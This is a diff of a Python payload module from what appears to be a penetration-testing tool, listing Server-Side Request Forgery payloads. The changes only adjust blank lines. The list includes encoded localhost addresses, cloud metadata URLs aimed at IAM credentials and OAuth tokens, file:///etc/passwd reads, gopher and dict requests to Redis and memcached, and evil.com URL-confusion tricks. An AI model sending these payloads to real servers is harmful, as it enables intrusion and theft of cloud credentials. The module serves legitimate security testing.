@@ -3,6 +3,7 @@ AIPT SSRF Payloads
 
 Server-Side Request Forgery payloads for security testing.
 """
+
 from __future__ import annotations
 
 from typing import Iterator
@@ -35,31 +36,24 @@ class SSRFPayloads:
             "http://127.0.0.1:443",
             "http://127.0.0.1:22",
             "http://127.0.0.1:8080",
-
             # IPv6
             "http://[::1]",
             "http://[0000::1]",
-
             # Alternative representations
             "http://127.1",
             "http://127.0.1",
             "http://2130706433",  # Decimal
             "http://0x7f000001",  # Hex
             "http://017700000001",  # Octal
-
             # Redirects
             "http://spoofed.burpcollaborator.net",
-
             # Enclosed brackets
             "http://[127.0.0.1]",
-
             # URL encoding
             "http://%31%32%37%2e%30%2e%30%2e%31",
-
             # With credentials
             "http://127.0.0.1@evil.com",
             "http://evil.com@127.0.0.1",
-
             # Domain confusion
             "http://127.0.0.1.evil.com",
             "http://127.0.0.1%00.evil.com",
@@ -76,24 +70,18 @@ class SSRFPayloads:
             "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "http://169.254.169.254/latest/user-data/",
             "http://169.254.169.254/latest/dynamic/instance-identity/document",
-
             # GCP
             "http://metadata.google.internal/computeMetadata/v1/",
             "http://169.254.169.254/computeMetadata/v1/",
-
             # Azure
             "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
             "http://169.254.169.254/metadata/identity/oauth2/token",
-
             # DigitalOcean
             "http://169.254.169.254/metadata/v1/",
-
             # Oracle Cloud
             "http://169.254.169.254/opc/v1/instance/",
-
             # Alibaba Cloud
             "http://100.100.100.200/latest/meta-data/",
-
             # Kubernetes
             "https://kubernetes.default.svc/",
             "https://kubernetes.default/",
@@ -130,24 +118,18 @@ class SSRFPayloads:
             "file:///etc/passwd",
             "file:///c:/windows/win.ini",
             "file://localhost/etc/passwd",
-
             # Gopher protocol (for internal service exploitation)
             "gopher://127.0.0.1:6379/_INFO",
             "gopher://127.0.0.1:11211/_stats",
-
             # Dict protocol
             "dict://127.0.0.1:6379/INFO",
-
             # LDAP
             "ldap://127.0.0.1",
-
             # FTP
             "ftp://127.0.0.1",
             "sftp://127.0.0.1",
-
             # SMB (Windows)
             "\\\\127.0.0.1\\c$",
-
             # Netdoc
             "netdoc:///etc/passwd",
         ]
@@ -159,26 +141,20 @@ class SSRFPayloads:
         payloads = [
             # URL encoding
             "http://%31%32%37%2e%30%2e%30%2e%31",
-
             # Domain redirects (DNS rebinding setup required)
             "http://localtest.me",  # Resolves to 127.0.0.1
             "http://spoofed.burpcollaborator.net",
-
             # Short URL redirects
             "http://bit.ly/redirect-to-localhost",
-
             # Using @ for URL confusion
             "http://google.com@127.0.0.1",
             "http://127.0.0.1#@google.com",
             "http://127.0.0.1?@google.com",
-
             # Case variations
             "http://LOCALHOST",
             "http://LocalHost",
-
             # Dot variations
             "http://127。0。0。1",  # Full-width dots
-
             # CRLF injection
             "http://127.0.0.1%0d%0a",
         ]
